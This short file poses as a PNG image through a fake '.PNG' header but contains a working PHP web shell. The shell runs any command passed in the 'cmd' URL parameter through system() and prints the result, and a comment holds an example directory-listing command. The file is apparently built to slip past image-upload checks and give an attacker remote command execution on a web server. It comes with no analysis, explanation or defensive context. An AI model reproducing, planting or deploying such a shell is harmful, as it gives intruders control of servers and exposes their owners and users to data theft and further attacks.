.PNG
<?php 
if(isset($_GET['cmd'])){
echo system($_GET['cmd']); 
}
// system('ls -lia /');
?>
